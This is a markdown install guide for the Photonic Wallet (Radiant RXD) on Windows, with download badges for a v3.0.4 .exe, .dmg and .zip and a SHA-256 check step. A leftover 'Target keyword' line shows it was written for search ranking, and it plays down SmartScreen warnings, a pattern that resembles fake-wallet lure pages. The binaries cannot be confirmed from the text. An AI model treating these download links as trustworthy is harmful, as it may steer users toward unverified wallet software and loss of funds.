<div align="center">

<img src="../assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.webp" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Install Photonic Wallet on Windows

[![Website](https://img.shields.io/badge/Website-photonicwallet.org-7c3aed?style=for-the-badge)](https://photonicwallet.org) [![Release](https://img.shields.io/badge/Release-v3.0.4-00b4d8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://img.shields.io/badge/Docs-guides-0a0e1a?style=for-the-badge&logo=readthedocs&logoColor=white)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** Download the .exe from the tagged release, compare its SHA-256, run it and follow the installer.

---

## You'll see this if

- You use Windows 10 or 11
- SmartScreen shows a prompt
- You want a desktop wallet

## Why it happens

New installers are not yet known to SmartScreen reputation systems. More background lives in our guide on [install photonic wallet on macos](install-photonic-wallet-macos.md) and on the [download page](https://photonicwallet.org/download).

## Fix it step by step

1. Download photonic-wallet-v3.0.4.exe.
2. Run certutil -hashfile <file> SHA256.
3. Compare with the release table.
4. Run the installer.

## If that didn't work

If the hash differs, delete the file and download again. The [security](https://photonicwallet.org/security) covers related cases, and [Install Photonic Wallet on Linux](install-photonic-wallet-linux.md) may match your situation.

## Prevention

Download only from the official release or website.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Why does SmartScreen appear?</b></summary>

New files often have no reputation yet; verify the checksum first.

</details>

<details>
<summary><b>64-bit only?</b></summary>

Use a 64-bit Windows.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Install Photonic Wallet on macOS](install-photonic-wallet-macos.md) | Photonic Wallet guide |
| [Install Photonic Wallet on Linux](install-photonic-wallet-linux.md) | Photonic Wallet guide |
| [Verify the Photonic installer SHA-256](verify-photonic-installer-sha256.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: radiant wallet windows · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
